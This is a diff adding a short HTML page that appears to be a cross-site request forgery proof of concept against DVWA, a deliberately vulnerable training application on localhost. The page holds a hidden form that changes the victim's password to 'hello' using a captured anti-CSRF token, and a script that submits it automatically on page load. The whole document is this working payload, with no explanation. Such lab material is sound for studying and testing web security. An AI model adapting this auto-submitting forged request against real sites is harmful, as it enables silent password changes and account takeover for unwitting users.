@@ -1,0 +1,17 @@
+ <html>
+  <body>
+  
+    <form action="http://localhost/DVWA/vulnerabilities/csrf/index.php">
+      <input type="hidden" name="password_new" value="hello" />
+      <input type="hidden" name="password_conf" value="hello" />
+      <input type="hidden" name="Change" value="Change" />
+      <input type="hidden" name="user_token" value="061095de2e8d60fb1a84166a829c0537" />
+      <input type="submit" value="Submit request" />
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+    
+  </body>
+</html>
